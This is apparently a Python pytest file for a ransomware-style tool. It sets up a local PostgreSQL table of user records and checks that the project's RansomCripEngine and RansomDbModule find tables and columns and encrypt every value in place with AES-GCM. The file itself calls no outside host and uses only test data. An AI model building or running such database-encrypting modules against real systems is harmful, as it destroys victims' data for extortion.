import os
import hashlib
import pytest

os.environ.setdefault("KEY_CRIP_DATA", "integration-test-key-2026")

from cryptography.hazmat.primitives.ciphers.aead import AESGCM


PG_URI = os.getenv(
    "PG_TEST_URI",
    "postgresql://postgres:testpass123@localhost:15432/testdb"
)

_NONCE_LEN = 12


def _can_connect_pg() -> bool:
    try:
        import psycopg2
        conn = psycopg2.connect(PG_URI, connect_timeout=3)
        conn.close()
        return True
    except Exception:
        return False


def _decrypt_hex(hex_str: str) -> bytes:
    blob = bytes.fromhex(hex_str)
    key_bytes = hashlib.sha256(
        os.getenv("KEY_CRIP_DATA", "").encode("utf-8")
    ).digest()
    aesgcm = AESGCM(key_bytes)
    return aesgcm.decrypt(blob[:_NONCE_LEN], blob[_NONCE_LEN:], None)


skip_no_pg = pytest.mark.skipif(
    not _can_connect_pg(),
    reason="PostgreSQL não disponível em localhost:15432"
)


@skip_no_pg
class TestRansomPostgres:

    @pytest.fixture(autouse=True)
    def setup_tables(self):
        import psycopg2
        conn = psycopg2.connect(PG_URI)
        conn.autocommit = True
        cursor = conn.cursor()

        cursor.execute("DROP TABLE IF EXISTS test_ransom")
        cursor.execute("""
            CREATE TABLE test_ransom (
                id SERIAL PRIMARY KEY,
                username TEXT NOT NULL,
                password_hash TEXT NOT NULL,
                email TEXT NOT NULL
            )
        """)

        for i, (user, pwd, email) in enumerate([
            ("alice",   "bcrypt:hash1", "alice@corp.com"),
            ("bob",     "bcrypt:hash2", "bob@corp.com"),
            ("carol",   "bcrypt:hash3", "carol@corp.com"),
            ("dave",    "bcrypt:hash4", "dave@corp.com"),
            ("eve",     "bcrypt:hash5", "eve@corp.com"),
        ]):
            cursor.execute(
                "INSERT INTO test_ransom (username, password_hash, email) VALUES (%s, %s, %s)",
                (user, pwd, email),
            )

        yield conn, cursor

        cursor.execute("DROP TABLE IF EXISTS test_ransom")
        conn.close()

    def test_pg_adapter_connects(self, setup_tables):
        from infra.adapters.sql.PostgreSqlAdapter import PostgreSqlAdapter
        adapter = PostgreSqlAdapter(PG_URI)
        tables = adapter.list_tables()
        assert "test_ransom" in tables

    def test_pg_adapter_gets_columns(self, setup_tables):
        from infra.adapters.sql.PostgreSqlAdapter import PostgreSqlAdapter
        adapter = PostgreSqlAdapter(PG_URI)
        columns = adapter.get_columns("test_ransom")
        col_names = [c.name for c in columns]
        assert "id" not in col_names
        assert "username" in col_names
        assert "password_hash" in col_names
        assert "email" in col_names

    def test_pg_columns_have_values(self, setup_tables):
        from infra.adapters.sql.PostgreSqlAdapter import PostgreSqlAdapter
        adapter = PostgreSqlAdapter(PG_URI)
        columns = adapter.get_columns("test_ransom")
        for col in columns:
            assert len(col.values) == 5, f"Coluna {col.name} deveria ter 5 valores"

    def test_pg_discovers_pk(self, setup_tables):
        from infra.adapters.sql.PostgreSqlAdapter import PostgreSqlAdapter
        adapter = PostgreSqlAdapter(PG_URI)
        pk = adapter._discover_pk("test_ransom")
        assert pk == "id"

    def test_encrypt_single_column(self, setup_tables):
        from infra.adapters.sql.PostgreSqlAdapter import PostgreSqlAdapter
        from infra.service.RansomCripEngine import RansomCripEngine

        conn, cursor = setup_tables
        adapter = PostgreSqlAdapter(PG_URI)
        engine  = RansomCripEngine()

        columns = adapter.get_columns("test_ransom")
        pwd_col = next(c for c in columns if c.name == "password_hash")

        count = [0]
        def write_fn(enc: bytes) -> None:
            pwd_col.write(enc)
            count[0] += 1

        engine.execute(write_fn, pwd_col.values)
        assert count[0] == 5

        cursor.execute("SELECT password_hash FROM test_ransom ORDER BY id")
        for row in cursor.fetchall():
            hex_val = row[0]
            assert len(hex_val) > 40
            bytes.fromhex(hex_val)

    def test_encrypt_all_columns_roundtrip(self, setup_tables):
        from infra.adapters.sql.PostgreSqlAdapter import PostgreSqlAdapter
        from infra.service.RansomCripEngine import RansomCripEngine

        conn, cursor = setup_tables
        adapter = PostgreSqlAdapter(PG_URI)
        engine  = RansomCripEngine()

        columns = adapter.get_columns("test_ransom")
        total = 0

        for col in columns:
            count = [0]
            def write_fn(enc: bytes, _col=col) -> None:
                _col.write(enc)
                count[0] += 1
            engine.execute(write_fn, col.values)
            total += count[0]

        assert total == 15

        cursor.execute("SELECT username FROM test_ransom WHERE id = 1")
        enc_hex = cursor.fetchone()[0]
        assert _decrypt_hex(enc_hex) == b"alice"

        cursor.execute("SELECT email FROM test_ransom WHERE id = 3")
        enc_hex = cursor.fetchone()[0]
        assert _decrypt_hex(enc_hex) == b"carol@corp.com"

    def test_full_sql_pipeline(self, setup_tables):
        from infra.modules.RansomDbModule import RansomDbModule
        module = RansomDbModule(broadcast=lambda _: None)
        count = module._run_sql("PostgreSQL", PG_URI)
        assert count >= 15

    @pytest.mark.asyncio
    async def test_full_handle_ransom_db(self, setup_tables):
        from infra.modules.RansomDbModule import RansomDbModule
        module = RansomDbModule(broadcast=lambda _: None)

        result = await module._handle_ransom_db({
            "db": "PostgreSQL",
            "mode": "single",
            "uri": PG_URI,
        })

        assert result.success is True
        assert result.data["encrypted"] >= 15
        assert result.data["db"] == "PostgreSQL"

    def test_pipe_separated_uri(self, setup_tables):
        from infra.modules.RansomDbModule import RansomDbModule
        module = RansomDbModule(broadcast=lambda _: None)
        count = module._run_sql("PostgreSQL", "localhost|15432|postgres|testpass123|testdb")
        assert count >= 15

    def test_invalid_uri_fails(self):
        from infra.adapters.sql.PostgreSqlAdapter import PostgreSqlAdapter
        with pytest.raises(Exception):
            PostgreSqlAdapter("postgresql://bad:bad@localhost:15432/nope")
